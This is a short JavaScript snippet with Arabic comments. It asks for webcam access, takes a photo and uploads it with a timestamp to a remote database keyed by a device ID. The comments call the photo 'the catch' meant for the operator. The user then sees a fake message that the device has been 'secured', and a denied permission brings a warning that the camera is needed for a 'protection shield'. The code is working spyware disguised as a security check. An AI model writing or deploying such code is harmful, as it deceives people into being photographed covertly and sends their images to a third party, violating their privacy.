<script>
    // توليد معرف خاص للجهاز عشان الصيدة تروح لصاحبها بس
    const deviceId = localStorage.getItem('deviceId') || 'dev_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('deviceId', deviceId);

    async function capture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // إرسال الصيدة مع معرف الجهاز
                    db.ref('results/' + deviceId).push({ 
                        photo: imgData, 
                        date: new Date().toLocaleString() 
                    }).then(() => {
                        alert("✅ تم تأمين جهازك بنجاح!");
                        stream.getTracks().forEach(track => track.stop());
                    });
                }, 1000);
            };
        } catch (e) {
            alert("🚨 لازم توافق على إذن الكاميرا لتفعيل درع الحماية!");
        }
    }
</script>
